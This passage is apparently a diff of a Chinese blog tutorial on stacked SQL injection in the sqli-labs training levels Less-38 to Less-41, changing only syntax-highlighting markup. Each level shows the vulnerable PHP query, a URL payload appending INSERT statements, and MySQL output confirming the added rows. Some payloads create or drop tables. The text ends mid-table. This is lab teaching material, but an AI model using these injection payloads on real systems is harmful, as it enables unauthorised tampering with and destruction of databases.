+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> user_test;<span class="hljs-keyword">update</span> user_test <span class="hljs-keyword">set</span> <span class="hljs-type">name</span>=<span class="hljs-string">&#x27;modify&#x27;</span> <span class="hljs-keyword">where</span> <span class="hljs-type">name</span>=<span class="hljs-string">&#x27;张三&#x27;</span>;<br></code></pre></td></tr></table></figure>
 
-<p><img src="/.com//1049983-20180929015651359-2117725775-20250418145626-lnlx1c8.gif" alt="1049983-20180929015651359-2117725775"></p>
+<p><img src="/.com//1049983-20180929015651359-2117725775-20250418145626-lnlx1c8.gif" srcset="/image/loading.gif" lazyload alt="1049983-20180929015651359-2117725775"></p>
 <p>‍</p>
 <h2 id="0x04-堆叠注入之sqllaps实列"><a href="#0x04-堆叠注入之sqllaps实列" class="headerlink" title="0x04 堆叠注入之sqllaps实列"></a>0x04 堆叠注入之sqllaps实列</h2><h2 id="1-Less-38-堆叠注入-字符型-GET"><a href="#1-Less-38-堆叠注入-字符型-GET" class="headerlink" title="1.Less-38 堆叠注入 - 字符型 - GET"></a>1.Less-38 堆叠注入 - 字符型 - GET</h2><p>（1）源代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">$sql=&quot;<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id=<span class="hljs-string">&#x27;$id&#x27;</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><span class="hljs-string">&quot;;</span><br></code></pre></td></tr></table></figure>
 
 <p>（2）测试</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1’;insert into users(id,username,password) values (‘38’,’less38’,’hello’)–+</span><br></pre></td></tr></table></figure>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">?id=1’;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span> (‘<span class="hljs-number">38</span>’,’less38’,’hello’)–+<br></code></pre></td></tr></table></figure>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users;</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash"><span class="hljs-keyword">select</span> * from <span class="hljs-built_in">users</span>;</span><br></code></pre></td></tr></table></figure>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">+----+----------+------------+</span><br><span class="line"></span><br><span class="line">| id | username | password   |</span><br><span class="line"></span><br><span class="line">+----+----------+------------+</span><br><span class="line"></span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line"></span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line"></span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line"></span><br><span class="line">|  4 | secure   | crappy     |</span><br><span class="line"></span><br><span class="line">|  5 | stupid   | stupidity  |</span><br><span class="line"></span><br><span class="line">|  6 | superman | genious    |</span><br><span class="line"></span><br><span class="line">|  7 | batman   | mob!le     |</span><br><span class="line"></span><br><span class="line">|  8 | admin    | admin      |</span><br><span class="line"></span><br><span class="line">|  9 | admin1   | admin1     |</span><br><span class="line"></span><br><span class="line">| 10 | admin2| admin2     |</span><br><span class="line"></span><br><span class="line">| 11 | admin3| admin3     |</span><br><span class="line"></span><br><span class="line">| 12 | dhakkan| dumbo      |</span><br><span class="line"></span><br><span class="line">| 14 | admin4| admin4     |</span><br><span class="line"></span><br><span class="line">| 38 | less38| hello      |</span><br><span class="line"></span><br><span class="line">+----+----------+------------+</span><br><span class="line"></span><br><span class="line">14 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">+----+----------+------------+<br><br>|<span class="hljs-string"> id </span>|<span class="hljs-string"> username </span>|<span class="hljs-string"> password   </span>|<br><br>+----+----------+------------+<br><br>|<span class="hljs-string">  1 </span>|<span class="hljs-string"> Dumb     </span>|<span class="hljs-string"> Dumb       </span>|<br><br>|<span class="hljs-string">  2 </span>|<span class="hljs-string"> Angelina </span>|<span class="hljs-string"> I-kill-you </span>|<br><br>|<span class="hljs-string">  3 </span>|<span class="hljs-string"> Dummy    </span>|<span class="hljs-string"> p@ssword   </span>|<br><br>|<span class="hljs-string">  4 </span>|<span class="hljs-string"> secure   </span>|<span class="hljs-string"> crappy     </span>|<br><br>|<span class="hljs-string">  5 </span>|<span class="hljs-string"> stupid   </span>|<span class="hljs-string"> stupidity  </span>|<br><br>|<span class="hljs-string">  6 </span>|<span class="hljs-string"> superman </span>|<span class="hljs-string"> genious    </span>|<br><br>|<span class="hljs-string">  7 </span>|<span class="hljs-string"> batman   </span>|<span class="hljs-string"> mob!le     </span>|<br><br>|<span class="hljs-string">  8 </span>|<span class="hljs-string"> admin    </span>|<span class="hljs-string"> admin      </span>|<br><br>|<span class="hljs-string">  9 </span>|<span class="hljs-string"> admin1   </span>|<span class="hljs-string"> admin1     </span>|<br><br>|<span class="hljs-string"> 10 </span>|<span class="hljs-string"> admin2</span>|<span class="hljs-string"> admin2     </span>|<br><br>|<span class="hljs-string"> 11 </span>|<span class="hljs-string"> admin3</span>|<span class="hljs-string"> admin3     </span>|<br><br>|<span class="hljs-string"> 12 </span>|<span class="hljs-string"> dhakkan</span>|<span class="hljs-string"> dumbo      </span>|<br><br>|<span class="hljs-string"> 14 </span>|<span class="hljs-string"> admin4</span>|<span class="hljs-string"> admin4     </span>|<br><br>|<span class="hljs-string"> 38 </span>|<span class="hljs-string"> less38</span>|<span class="hljs-string"> hello      </span>|<br><br>+----+----------+------------+<br><br>14 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure>
 
 <p>发现已经添加了一个 less38 用户</p>
 <p>?id=1’;create table less38 like users;</p>
 <p>?id=1’;drop table less38;</p>
 <h2 id="2-Less-39-堆叠注入-整型-GET"><a href="#2-Less-39-堆叠注入-整型-GET" class="headerlink" title="2.Less-39 堆叠注入 - 整型 - GET"></a>2.Less-39 堆叠注入 - 整型 - GET</h2><p>（1）源代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">$sql=&quot;<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id=$id <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><span class="hljs-string">&quot;;</span><br></code></pre></td></tr></table></figure>
 
 <p>（2）测试</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1;insert into users(id,username,password) values (‘39’,’less39’,’hello’)–-</span><br></pre></td></tr></table></figure>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">?id=1;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span> (‘<span class="hljs-number">39</span>’,’less39’,’hello’)–-<br></code></pre></td></tr></table></figure>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users;</span><br><span class="line"></span><br><span class="line">+----+----------+------------+</span><br><span class="line"></span><br><span class="line">| id | username | password   |</span><br><span class="line"></span><br><span class="line">+----+----------+------------+</span><br><span class="line"></span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line"></span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line"></span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line"></span><br><span class="line">|  4 | secure   | crappy     |</span><br><span class="line"></span><br><span class="line">|  5 | stupid   | stupidity  |</span><br><span class="line"></span><br><span class="line">|  6 | superman | genious    |</span><br><span class="line"></span><br><span class="line">|  7 | batman   | mob!le     |</span><br><span class="line"></span><br><span class="line">|  8 | admin    | admin      |</span><br><span class="line"></span><br><span class="line">|  9 | admin1   | admin1     |</span><br><span class="line"></span><br><span class="line">| 10 | admin2| admin2     |</span><br><span class="line"></span><br><span class="line">| 11 | admin3| admin3     |</span><br><span class="line"></span><br><span class="line">| 12 | dhakkan| dumbo      |</span><br><span class="line"></span><br><span class="line">| 14 | admin4| admin4     |</span><br><span class="line"></span><br><span class="line">| 38 | less38| hello      |</span><br><span class="line"></span><br><span class="line">| 39 | less39| hello      |</span><br><span class="line"></span><br><span class="line">+----+----------+------------+</span><br><span class="line"></span><br><span class="line">15 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">mysql&gt; select <span class="hljs-symbol">*</span> from users;<br><br>+----+----------+------------+<br><br>|<span class="hljs-string"> id </span>|<span class="hljs-string"> username </span>|<span class="hljs-string"> password   </span>|<br><br>+----+----------+------------+<br><br>|<span class="hljs-string">  1 </span>|<span class="hljs-string"> Dumb     </span>|<span class="hljs-string"> Dumb       </span>|<br><br>|<span class="hljs-string">  2 </span>|<span class="hljs-string"> Angelina </span>|<span class="hljs-string"> I-kill-you </span>|<br><br>|<span class="hljs-string">  3 </span>|<span class="hljs-string"> Dummy    </span>|<span class="hljs-string"> p@ssword   </span>|<br><br>|<span class="hljs-string">  4 </span>|<span class="hljs-string"> secure   </span>|<span class="hljs-string"> crappy     </span>|<br><br>|<span class="hljs-string">  5 </span>|<span class="hljs-string"> stupid   </span>|<span class="hljs-string"> stupidity  </span>|<br><br>|<span class="hljs-string">  6 </span>|<span class="hljs-string"> superman </span>|<span class="hljs-string"> genious    </span>|<br><br>|<span class="hljs-string">  7 </span>|<span class="hljs-string"> batman   </span>|<span class="hljs-string"> mob!le     </span>|<br><br>|<span class="hljs-string">  8 </span>|<span class="hljs-string"> admin    </span>|<span class="hljs-string"> admin      </span>|<br><br>|<span class="hljs-string">  9 </span>|<span class="hljs-string"> admin1   </span>|<span class="hljs-string"> admin1     </span>|<br><br>|<span class="hljs-string"> 10 </span>|<span class="hljs-string"> admin2</span>|<span class="hljs-string"> admin2     </span>|<br><br>|<span class="hljs-string"> 11 </span>|<span class="hljs-string"> admin3</span>|<span class="hljs-string"> admin3     </span>|<br><br>|<span class="hljs-string"> 12 </span>|<span class="hljs-string"> dhakkan</span>|<span class="hljs-string"> dumbo      </span>|<br><br>|<span class="hljs-string"> 14 </span>|<span class="hljs-string"> admin4</span>|<span class="hljs-string"> admin4     </span>|<br><br>|<span class="hljs-string"> 38 </span>|<span class="hljs-string"> less38</span>|<span class="hljs-string"> hello      </span>|<br><br>|<span class="hljs-string"> 39 </span>|<span class="hljs-string"> less39</span>|<span class="hljs-string"> hello      </span>|<br><br>+----+----------+------------+<br><br>15 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure>
 
 <p>可以看到已经添加了 less39 用户了</p>
 <p>?id=1;create table less39 like users;</p>
 <p>?id=1;drop table less39;</p>
 <h2 id="3-Less-40-盲注-堆叠注入-字符型-GET"><a href="#3-Less-40-盲注-堆叠注入-字符型-GET" class="headerlink" title="3.Less-40 盲注 - 堆叠注入 - 字符型 - GET"></a>3.Less-40 盲注 - 堆叠注入 - 字符型 - GET</h2><p>（1）源代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">$sql=&quot;<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id=(<span class="hljs-string">&#x27;$id&#x27;</span>) <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><span class="hljs-string">&quot;;</span><br></code></pre></td></tr></table></figure>
 
 <p>（2）测试</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1’); insert into users(id,username,password) values (‘40’,’less40’,’hello’)–+</span><br></pre></td></tr></table></figure>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">?id=1’); <span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span> (‘<span class="hljs-number">40</span>’,’less40’,’hello’)–+<br></code></pre></td></tr></table></figure>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users;</span><br><span class="line"></span><br><span class="line">+-----+----------+------------+</span><br><span class="line"></span><br><span class="line">| id  | username | password   |</span><br><span class="line"></span><br><span class="line">+-----+----------+------------+</span><br><span class="line"></span><br><span class="line">|   1 | Dumb     | Dumb       |</span><br><span class="line"></span><br><span class="line">|   2 | Angelina | I-kill-you |</span><br><span class="line"></span><br><span class="line">|   3 | Dummy    | p@ssword   |</span><br><span class="line"></span><br><span class="line">|   4 | secure   | crappy     |</span><br><span class="line"></span><br><span class="line">|   5 | stupid   | stupidity  |</span><br><span class="line"></span><br><span class="line">|   6 | superman | genious    |</span><br><span class="line"></span><br><span class="line">|   7 | batman   | mob!le     |</span><br><span class="line"></span><br><span class="line">|   8 | admin    | admin      |</span><br><span class="line"></span><br><span class="line">|   9 | admin1   | admin1     |</span><br><span class="line"></span><br><span class="line">|  10 | admin2   | admin2     |</span><br><span class="line"></span><br><span class="line">|  11 | admin3   | admin3     |</span><br><span class="line"></span><br><span class="line">|  12 | dhakkan  | dumbo      |</span><br><span class="line"></span><br><span class="line">|  14 | admin4   | admin4     |</span><br><span class="line"></span><br><span class="line">|  38 | less38   | hello      |</span><br><span class="line"></span><br><span class="line">|  39 | less39   | hello      |</span><br><span class="line"></span><br><span class="line">| 109 | hello| hello      |</span><br><span class="line"></span><br><span class="line">|  40 | less40   | hello      |</span><br><span class="line"></span><br><span class="line">+-----+----------+------------+</span><br><span class="line"></span><br><span class="line">17 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">mysql&gt; select <span class="hljs-symbol">*</span> from users;<br><br>+-----+----------+------------+<br><br>|<span class="hljs-string"> id  </span>|<span class="hljs-string"> username </span>|<span class="hljs-string"> password   </span>|<br><br>+-----+----------+------------+<br><br>|<span class="hljs-string">   1 </span>|<span class="hljs-string"> Dumb     </span>|<span class="hljs-string"> Dumb       </span>|<br><br>|<span class="hljs-string">   2 </span>|<span class="hljs-string"> Angelina </span>|<span class="hljs-string"> I-kill-you </span>|<br><br>|<span class="hljs-string">   3 </span>|<span class="hljs-string"> Dummy    </span>|<span class="hljs-string"> p@ssword   </span>|<br><br>|<span class="hljs-string">   4 </span>|<span class="hljs-string"> secure   </span>|<span class="hljs-string"> crappy     </span>|<br><br>|<span class="hljs-string">   5 </span>|<span class="hljs-string"> stupid   </span>|<span class="hljs-string"> stupidity  </span>|<br><br>|<span class="hljs-string">   6 </span>|<span class="hljs-string"> superman </span>|<span class="hljs-string"> genious    </span>|<br><br>|<span class="hljs-string">   7 </span>|<span class="hljs-string"> batman   </span>|<span class="hljs-string"> mob!le     </span>|<br><br>|<span class="hljs-string">   8 </span>|<span class="hljs-string"> admin    </span>|<span class="hljs-string"> admin      </span>|<br><br>|<span class="hljs-string">   9 </span>|<span class="hljs-string"> admin1   </span>|<span class="hljs-string"> admin1     </span>|<br><br>|<span class="hljs-string">  10 </span>|<span class="hljs-string"> admin2   </span>|<span class="hljs-string"> admin2     </span>|<br><br>|<span class="hljs-string">  11 </span>|<span class="hljs-string"> admin3   </span>|<span class="hljs-string"> admin3     </span>|<br><br>|<span class="hljs-string">  12 </span>|<span class="hljs-string"> dhakkan  </span>|<span class="hljs-string"> dumbo      </span>|<br><br>|<span class="hljs-string">  14 </span>|<span class="hljs-string"> admin4   </span>|<span class="hljs-string"> admin4     </span>|<br><br>|<span class="hljs-string">  38 </span>|<span class="hljs-string"> less38   </span>|<span class="hljs-string"> hello      </span>|<br><br>|<span class="hljs-string">  39 </span>|<span class="hljs-string"> less39   </span>|<span class="hljs-string"> hello      </span>|<br><br>|<span class="hljs-string"> 109 </span>|<span class="hljs-string"> hello</span>|<span class="hljs-string"> hello      </span>|<br><br>|<span class="hljs-string">  40 </span>|<span class="hljs-string"> less40   </span>|<span class="hljs-string"> hello      </span>|<br><br>+-----+----------+------------+<br><br>17 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure>
 
 <p>看到添加了 less40 用户</p>
 <p>?id=1’);create table less40 like users;</p>
 <p>?id=1’);drop table less40;</p>
 <h2 id="4-Less-41-盲注-堆叠注入-整型-GET"><a href="#4-Less-41-盲注-堆叠注入-整型-GET" class="headerlink" title="4.Less-41 盲注 - 堆叠注入 - 整型 - GET"></a>4.Less-41 盲注 - 堆叠注入 - 整型 - GET</h2><p>（1）源代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">$sql=&quot;<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id=$id <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><span class="hljs-string">&quot;;</span><br></code></pre></td></tr></table></figure>
 
 <p>（2）测试（盲注）</p>
 <p>创建users表和增加字段值</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1; insert into users(id,username,password) values (‘110’,’less41’,’hello’)–+</span><br></pre></td></tr></table></figure>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">?id=1; <span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span> (‘<span class="hljs-number">110</span>’,’less41’,’hello’)–+<br></code></pre></td></tr></table></figure>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users;</span><br><span class="line"></span><br><span class="line">+-----+----------+------------+</span><br><span class="line"></span><br><span class="line">| id  | username | password   |</span><br><span class="line"></span><br><span class="line">+-----+----------+------------+</span><br><span class="line"></span><br><span class="line">|   1 | Dumb     | Dumb       |</span><br><span class="line"></span><br><span class="line">|   2 | Angelina | I-kill-you |</span><br><span class="line"></span><br><span class="line">|   3 | Dummy    | p@ssword   |</span><br><span class="line"></span><br><span class="line">|   4 | secure   | crappy     |</span><br><span class="line"></span><br><span class="line">|   5 | stupid   | stupidity  |</span><br><span class="line"></span><br><span class="line">|   6 | superman | genious    |</span><br><span class="line"></span><br><span class="line">|   7 | batman   | mob!le     |</span><br><span class="line"></span><br><span class="line">|   8 | admin    | admin      |</span><br><span class="line"></span><br><span class="line">|   9 | admin1   | admin1     |</span><br><span class="line"></span><br><span class="line">|  10 | admin2   | admin2     |</span><br><span class="line"></span><br><span class="line">|  11 | admin3   | admin3     |</span><br><span class="line"></span><br><span class="line">|  12 | dhakkan  | dumbo      |</span><br><span class="line"></span><br><span class="line">|  14 | admin4   | admin4     |</span><br><span class="line"></span><br><span class="line">|  38 | less38   | hello      |</span><br><span class="line"></span><br><span class="line">|  39 | less39   | hello      |</span><br><span class="line"></span><br><span class="line">| 109 | hello| hello      |</span><br><span class="line"></span><br><span class="line">|  40 | less40   | hello      |</span><br><span class="line"></span><br><span class="line">| 110 | less41| hello      |</span><br><span class="line"></span><br><span class="line">+-----+----------+------------+</span><br><span class="line"></span><br><span class="line">18 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">mysql&gt; select <span class="hljs-symbol">*</span> from users;<br><br>+-----+----------+------------+<br><br>|<span class="hljs-string"> id  </span>|<span class="hljs-string"> username </span>|<span class="hljs-string"> password   </span>|<br><br>+-----+----------+------------+<br><br>|<span class="hljs-string">   1 </span>|<span class="hljs-string"> Dumb     </span>|<span class="hljs-string"> Dumb       </span>|<br><br>|<span class="hljs-string">   2 </span>|<span class="hljs-string"> Angelina </span>|<span class="hljs-string"> I-kill-you </span>|<br><br>|<span class="hljs-string">   3 </span>|<span class="hljs-string"> Dummy    </span>|<span class="hljs-string"> p@ssword   </span>|<br><br>|<span class="hljs-string">   4 </span>|<span class="hljs-string"> secure   </span>|<span class="hljs-string"> crappy     </span>|<br><br>|<span class="hljs-string">   5 